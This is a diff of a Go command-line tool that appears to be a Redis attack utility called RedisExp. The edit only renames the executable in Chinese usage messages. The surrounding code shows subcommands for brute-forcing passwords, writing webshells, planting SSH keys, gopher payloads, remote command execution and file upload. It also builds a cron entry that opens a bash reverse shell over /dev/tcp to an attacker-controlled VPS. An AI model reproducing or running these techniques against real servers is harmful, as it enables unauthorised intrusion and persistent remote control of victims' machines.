@@ -54,7 +54,7 @@ var bruteCmd = &cobra.Command{
 	Long:  "",
 	Run: func(cmd *cobra.Command, args []string) {
 		if strings.EqualFold(rhost, "") || strings.EqualFold(pwd, "") {
-			fmt.Println("参数错误: Redis.exe brute -r 目标IP -p 目标端口 -f 字典文件")
+			fmt.Println("参数错误: RedisExp.exe brute -r 目标IP -p 目标端口 -f 字典文件")
 			return
 		}
 		BrutePWD(rhost, rport, pwd)
@@ -72,7 +72,7 @@ var echoShellCmd = &cobra.Command{
 			return
 		}
 		if strings.EqualFold(rpath, "") || strings.EqualFold(rfile, "") || strings.EqualFold(webshell, "") {
-			fmt.Println("参数错误: Redis.exe shell -r 目标IP -p 目标端口 -w 密码 -d 目标路径 -f 目标文件名 -s Webshell内容")
+			fmt.Println("参数错误: RedisExp.exe shell -r 目标IP -p 目标端口 -w 密码 -d 目标路径 -f 目标文件名 -s Webshell内容")
 			return
 		}
 		if gbk {
@@ -94,7 +94,7 @@ var echoSshCmd = &cobra.Command{
 			return
 		}
 		if strings.EqualFold(user, "") || strings.EqualFold(webshell, "") {
-			fmt.Println("参数错误: Redis.exe ssh -r 目标IP -p 目标端口 -w 密码 -n 用户名 -s 公钥")
+			fmt.Println("参数错误: RedisExp.exe ssh -r 目标IP -p 目标端口 -w 密码 -n 用户名 -s 公钥")
 			return
 		}
 
@@ -121,7 +121,7 @@ var echoCrontabCmd = &cobra.Command{
 			return
 		}
 		if strings.EqualFold(lhost, "") || strings.EqualFold(lport, "") {
-			fmt.Println("参数错误: Redis.exe cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort")
+			fmt.Println("参数错误: RedisExp.exe cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort")
 			return
 		}
 		webshell = fmt.Sprintf("*/1 * * * * root bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
@@ -157,7 +157,7 @@ var gopherCmd = &cobra.Command{
 	Long:  "",
 	Run: func(cmd *cobra.Command, args []string) {
 		if strings.EqualFold(lfile, "") {
-			fmt.Println("参数错误: Redis.exe gopher -f 1.txt")
+			fmt.Println("参数错误: RedisExp.exe gopher -f 1.txt")
 			return
 		}
 		i, err := ReadFile(lfile)
@@ -183,7 +183,7 @@ var rceCmd = &cobra.Command{
 			return
 		}
 		if strings.EqualFold(lhost, "") {
-			fmt.Println("参数错误: Redis.exe -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行]")
+			fmt.Println("参数错误: RedisExp.exe -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行]")
 			return
 		}
 		if gbk {
@@ -216,7 +216,7 @@ var uploadCmd = &cobra.Command{
 			return
 		}
 		if strings.EqualFold(lhost, "") || strings.EqualFold(rfile, "") || strings.EqualFold(lfile, "") {
-			fmt.Println("参数错误: Redis.exe -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -d 目标路径 -f 目标文件名 -F 本地文件")
+			fmt.Println("参数错误: RedisExp.exe -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -d 目标路径 -f 目标文件名 -F 本地文件")
 			return
 		}
 
